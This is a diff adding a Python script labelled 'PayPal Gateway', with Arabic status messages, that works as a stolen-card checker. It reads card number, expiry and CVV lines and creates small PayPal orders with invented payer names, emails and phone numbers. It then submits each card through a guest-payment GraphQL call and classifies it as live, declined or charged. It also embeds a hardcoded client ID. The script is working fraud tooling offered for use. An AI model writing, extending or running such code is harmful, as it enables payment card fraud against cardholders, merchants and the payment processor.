@@ -1,0 +1,127 @@
+"""
+PayPal Gateway
+"""
+
+import requests
+import re
+import random
+import uuid
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+CLIENT_ID = 'Abbl3qbVZxe9QoSsjOTNomMJy1WYEt-6m-t-N_duN7xPWKVnQnku51N6wPHnP9E0Nzu5C0qjuBYDXqnz'
+
+def get_card_type(cc):
+    if cc.startswith('4'):
+        return 'VISA'
+    elif cc.startswith(('51', '52', '53', '54', '55')):
+        return 'MASTER_CARD'
+    elif cc.startswith(('34', '37')):
+        return 'AMEX'
+    return 'VISA'
+
+def get_paypal_access_token():
+    token_headers = {
+        'accept': 'application/json',
+        'content-type': 'application/x-www-form-urlencoded',
+    }
+    token_data = {'grant_type': 'client_credentials'}
+    token_resp = requests.post('https://api.paypal.com/v1/oauth2/token', data=token_data, headers=token_headers, auth=(CLIENT_ID, ''), timeout=15)
+    try:
+        return token_resp.json().get('access_token')
+    except:
+        return None
+
+def check_card(card_input):
+    """فحص بطاقة عبر PayPal"""
+    parts = card_input.split('|')
+    if len(parts) < 4:
+        return "INVALID", "صيغة خاطئة", ""
+
+    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
+
+    if len(yy) == 2:
+        yy = '20' + yy
+    if len(mm) == 1:
+        mm = '0' + mm
+
+    card_type = get_card_type(cc)
+
+    access_token = get_paypal_access_token()
+    if not access_token:
+        return "ERROR", "فشل Access Token", ""
+
+    fn = random.choice(['John', 'James', 'Robert'])
+    ln = random.choice(['Smith', 'Johnson', 'Brown'])
+    email = f'{fn.lower()}{random.randint(100,999)}@gmail.com'
+    zip_code = str(random.randint(10001, 99999))
+
+    order_payload = {
+        "intent": "CAPTURE",
+        "purchase_units": [{
+            "amount": {"value": "10.30", "currency_code": "USD"}
+        }],
+        "payer": {
+            "email_address": email,
+            "name": {"name": f"{fn} {ln}"},
+            "address": {"postal_code": zip_code, "country_code": "US"}
+        }
+    }
+
+    api_headers = {
+        'Authorization': f'Bearer {access_token}',
+        'Content-Type': 'application/json',
+    }
+
+    order_resp = requests.post('https://api.paypal.com/v2/checkout/orders', json=order_payload, headers=api_headers, timeout=20)
+    try:
+        order_id = order_resp.json().get('id')
+    except:
+        return "ERROR", "فشل إنشاء Order", ""
+
+    if not order_id:
+        return "ERROR", "لا يوجد Order ID", ""
+
+    graphql_payload = {
+        "query": "mutation payWithCard(...) { approveGuestPaymentWithCreditCard(...) { cart { cartId } } }",
+        "variables": {
+            "token": order_id,
+            "card": {
+                "cardNumber": cc,
+                "type": card_type,
+                "expirationDate": f"{mm}/{yy}",
+                "postalCode": zip_code,
+                "securityCode": cvv
+            },
+            "phoneNumber": f"+1{random.randint(2000000000, 9999999999)}",
+            "firstName": fn,
+            "lastName": ln,
+            "email": email
+        }
+    }
+
+    graphql_resp = requests.post('https://www.paypal.com/graphql?paywithcard', json=graphql_payload, headers=api_headers, timeout=20)
+
+    try:
+        graphql_json = graphql_resp.json()
+    except:
+        return "ERROR", "استجابة غير صالحة", ""
+
+    if 'errors' in graphql_json:
+        error_msg = graphql_json['errors'][0].get('message', '')
+        msg_lower = error_msg.lower()
+
+        if 'invalid_security_code' in msg_lower:
+            return "APPROVED", "CCN Live / CVV Dead", ""
+        if 'insufficient_funds' in msg_lower:
+            return "APPROVED", "رصيد غير كافي", ""
+        if 'card_declined' in msg_lower:
+            return "DECLINED", "البطاقة مرفوضة", ""
+        return "DECLINED", error_msg, ""
+
+    data = graphql_json.get('data', {}).get('approveGuestPaymentWithCreditCard', {})
+    if data.get('cart', {}).get('cartId'):
+        return "CHARGED", "تم الشحن - $10.30", ""
+
+    return "UNKNOWN", "نتيجة غير معروفة", ""
